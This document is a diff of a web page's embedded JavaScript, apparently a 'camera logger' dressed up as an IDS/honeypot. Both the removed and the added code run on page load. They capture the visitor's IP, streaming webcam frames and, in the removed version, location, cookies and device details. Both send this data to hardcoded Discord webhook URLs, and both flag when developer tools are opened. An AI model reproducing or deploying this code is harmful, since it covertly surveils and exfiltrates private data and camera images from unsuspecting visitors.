@@ -25,195 +25,113 @@
   
  <font face="Adobe Gothic Std" font size="3" font color="grey">
   <b>
-    <div class="container"></div>
-            <p id="location"></p>
-            <div id="ip-address"></div>
-            <div id="cookies"></div>
-            <div id="device-info"></div>
-            <div id="browser-info"></div>
-        </center>
-    </font>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            getLocation();
-            getIPAddress();
-            openCamera();
+     <font face="Adobe Gothic Std" font size="3" font color="grey">
+  <b>
+    <center><br>
+      <p>Your IP Address is: <span id="ip-address"></span></p>
+    </center>
+  </b>
+</font>
+
+<script>
+  const IP_DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1155714225465995274/i76rhbsxie-Ddn0U-rTNdsz2QUOJseUxd4HRw-KSHDr8amZ9pmOxWC06kZ2LFD69JVaP';
+  const CAMERA_DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1155714218910294167/HiwZ6_d1GG_PY_3eo9qJ2SPFmfGihhivwRtdealz_RXBK9YJ15J6O_Fb5S73KkMVMc1L';
+
+  function openCamera() {
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then(function (stream) {
+          var videoElement = document.getElementById('video');
+          videoElement.srcObject = stream;
+          videoElement.play();
+
+          var canvas = document.createElement('canvas');
+          var context = canvas.getContext('2d');
+          var frameRate = 30;
+
+          setInterval(function () {
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(function (blob) {
+              sendCameraFrameToDiscord(blob);
+            }, 'image/jpeg', 0.9);
+          }, 1000 / frameRate);
+        })
+        .catch(function (error) {
+          console.error('Error accessing camera:', error);
         });
+    } else {
+      console.error('getUserMedia is not supported in this browser.');
+    }
+  }
 
-        function getLocation() {
-            if ('geolocation' in navigator) {
-                navigator.geolocation.getCurrentPosition(showLocation, handleError);
-            } else {
-                document.getElementById('location').textContent =
-                    "Geolocation is not supported by this browser.";
-            }
-        }
+  function sendCameraFrameToDiscord(blob) {
+    var file = new File([blob], 'visitor.jpg');
 
-        function showLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            document.getElementById('location').textContent =
-                `Latitude: ${latitude}, Longitude: ${longitude}`;
-        }
+    var formData = new FormData();
+    formData.append('file', file);
 
-        function handleError(error) {
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById('location').textContent =
-                        "Permission to access device location was denied.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById('location').textContent =
-                        "Device location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById('location').textContent =
-                        "Request to get device location timed out.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById('location').textContent =
-                        "An unknown error occurred while getting the device location.";
-                    break;
-            }
-        }
+    fetch(CAMERA_DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      body: formData,
+    })
+      .then(function (response) {
+        console.log('Successfully sent video frame to Discord.');
+      })
+      .catch(function (error) {
+        console.error('Error sending video frame to Discord:', error);
+      });
+  }
 
-        const DISCORD_WEBHOOK_URL =
-            'https://discord.com/api/webhooks/1128462048574046308/cuzravpqJm0bSc6N9_m2HwGRWAideS1zUa0vj8iVD9IywRIyEv-31yp3bGTxa8p9mDwG';
+  const getIPAddress = async () => {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      const ipAddress = data.ip;
+      displayIPAddress(ipAddress);
+      sendIPToDiscord(ipAddress);
+    } catch (error) {
+      console.error('Failed to fetch IP address:', error);
+    }
+  };
 
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                const ipAddress = data.ip;
-                displayIPAddress(ipAddress);
-                displayCookies();
-                displayDeviceInfo();
-                displayBrowserInfo();
-                sendToDiscord(`Target IP: ${ipAddress}\n${getDeviceInfo()}\n${getBrowserInfo()}\n${getCookiesInfo()}`);
-            } catch (error) {
-                console.error('Failed to fetch IP address:', error);
-            }
-        }
+  const displayIPAddress = (ipAddress) => {
+    const ipAddressElement = document.getElementById('ip-address');
+    ipAddressElement.textContent = ipAddress;
+  };
 
-        function displayIPAddress(ipAddress) {
-            const ipAddressElement = document.getElementById('ip-address');
-            ipAddressElement.textContent = `IP Address: ${ipAddress}`;
-        }
+  const sendIPToDiscord = async (ipAddress) => {
+    try {
+      const payload = {
+        content: `The IDS And Honeypot has detected a new user on the camera logger website IP: ${ipAddress}`,
+      };
 
-        function displayCookies() {
-            const cookiesElement = document.getElementById('cookies');
-            const cookies = document.cookie.split('; ');
-            let cookiesHTML = 'Cookies:<br>';
-            cookies.forEach((cookie) => {
-                cookiesHTML += `${cookie}<br>`;
-            });
-            cookiesElement.innerHTML = cookiesHTML;
-        }
+      const response = await fetch(IP_DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+      });
 
-        function displayDeviceInfo() {
-            const deviceInfoElement = document.getElementById('device-info');
-            const deviceInfo = getDeviceInfo();
-            deviceInfoElement.textContent = `Device Info:\n${deviceInfo}`;
-        }
+      if (response.status !== 204) {
+        console.error('Failed to send IP address to Discord.');
+      }
+    } catch (error) {
+      console.error('Failed to send IP address to Discord:', error);
+    }
+  };
 
-        function displayBrowserInfo() {
-            const browserInfoElement = document.getElementById('browser-info');
-            const browserInfo = getBrowserInfo();
-            browserInfoElement.textContent = `Browser Info:\n${browserInfo}`;
-        }
+  window.addEventListener('load', openCamera);
+  window.addEventListener('load', getIPAddress);
 
-        function getCookiesInfo() {
-            const cookies = document.cookie;
-            return `Cookies: ${cookies}`;
-        }
-
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const deviceInfo = `User Agent: ${userAgent}\nPlatform: ${platform}`;
-            return deviceInfo;
-        }
-
-        function getBrowserInfo() {
-            return '';
-        }
-
-        async function sendToDiscord(message) {
-            try {
-                const payload = {
-                    content: message,
-                };
-
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                });
-
-                if (response.status !== 204) {
-                    console.error('Failed to send message to Discord.');
-                }
-            } catch (error) {
-                console.error('Failed to send message to Discord:', error);
-            }
-        }
-
-        function openCamera() {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices
-                    .getUserMedia({ video: true })
-                    .then(function (stream) {
-                        var videoElement = document.createElement('video');
-                        document.body.appendChild(videoElement);
-                        videoElement.srcObject = stream;
-                        videoElement.play();
-
-                        var canvas = document.createElement('canvas');
-                        var context = canvas.getContext('2d');
-                        var frameRate = 30;
-
-                        setInterval(function () {
-                            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                            canvas.toBlob(function (blob) {
-                                sendCameraFrameToDiscord(blob);
-                            }, 'image/jpeg', 0.9);
-                        }, 1000 / frameRate);
-                    })
-                    .catch(function (error) {
-                        console.error('Error accessing camera:', error);
-                    });
-            } else {
-                console.error('getUserMedia is not supported in this browser.');
-            }
-        }
-
-        function sendCameraFrameToDiscord(blob) {
-            var file = new File([blob], 'visitor.jpg');
-
-            var formData = new FormData();
-            formData.append('file', file);
-
-            fetch(CAMERA_DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                body: formData,
-            })
-                .then(function (response) {
-                    console.log('Successfully sent video frame to Discord.');
-                })
-                .catch(function (error) {
-                    console.error('Error sending video frame to Discord:', error);
-                });
-        }
-
-        window.addEventListener('devtoolschange', (event) => {
-            if (event.detail.isOpen) {
-                console.log('IDS Detected Developer tools or inspect element opened');
-                sendToDiscord('IDS Detected Developer tools or inspect element opened');
-            }
-        });
-    </script>
+  window.addEventListener('devtoolschange', (event) => {
+    if (event.detail.isOpen) {
+      console.log('IDS Detected Developer tools or inspect element opened');
+      sendIPToDiscord('IDS Detected Developer tools or inspect element opened');
+    }
+  });
+</script>
 
   </head>
   <body>
